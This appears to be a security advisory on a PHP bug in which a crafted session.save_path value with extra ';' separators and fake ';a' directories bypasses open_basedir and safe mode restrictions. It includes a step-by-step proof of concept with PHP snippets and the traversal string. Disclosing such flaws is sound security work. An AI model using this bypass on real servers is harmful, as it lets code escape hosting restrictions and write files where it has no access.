--- 0.Description ---
PHP is an HTML-embedded scripting language. Much of its syntax is
borrowed from C, Java and Perl with a couple of unique PHP-specific
features thrown in. The goal of the language is to allow web developers
to write dynamically generated pages quickly.

A visitor accessing your web site is assigned a unique id, the so-called
session id. This is either stored in a cookie on the user side or is
propagated in the URL.

session.save_path defines the argument which is passed to the save
handler. If you choose the default files handler, this is the path where
the files are created. Defaults to /tmp. See also session_save_path().

There is an optional N argument to this directive that determines the
number of directory levels your session files will be spread around in.
For example, setting to '5;/tmp' may end up creating a session file and
location like /tmp/4/b/1/e/3/sess_4b1e384ad74619bd212e236e52a5a174If .
In order to use N you must create all of these directories before use. A
small shell script exists in ext/session to do this, it's called
mod_files.sh. Also note that if N is used and greater than 0 then
automatic garbage collection will not be performed, see a copy of
php.ini for further information. Also, if you use N, be sure to surround
session.save_path in "quotes" because the separator (;) is also used for
comments in php.ini.

---- 1. session.save_path safe mode and open basedir bypass ---
session.save_path can be set via ini_set(), session_save_path()
functions. In session.save_path there should be path where you will save
yours tmp files. But syntax for session.save_path is:

[/PATH]

OR

[N;/PATH]

N - can be also a string (N should be numeric).

EXAMPLES:

1. session_save_path("/DIR/WHERE/YOU/HAVE/ACCESS")
2. session_save_path("5;/DIR/WHERE/YOU/HAVE/ACCESS")

The main problem came when we use multiple ';' character and when we
will create fake directory structure to reduce '../'.

Proof of Concept:
0. Create directories:

/humhum

and

/byp

1. set open_basedir = /byp
2. create test.php
{
	session_save_path("/humhum");
	session_start();
}
3. php test.php

Warning: session_save_path(): open_basedir restriction in effect.
File(/humhum) is not within the allowed path(s): (/byp) in /byp/test.php
on line 3
4. subdir.php
{
mkdir("puf");
mkdir(";a");
}
5. php subdir.php
6. cd puf
7. create byp.php
{

session_save_path(";;/byp/;a/../../humhum");
session_start();

}
8. php byp.php
9. ls /humhum
sess_d905eb71c9ad65ce2a845cdb0fed3016

The main problem is located in session.c. PHP doesn't check, that we
have used next ';' after first. Creating fake directory structure

mkdir ';a'
mkdir '../;a'

we can reduce directory level using '../' .
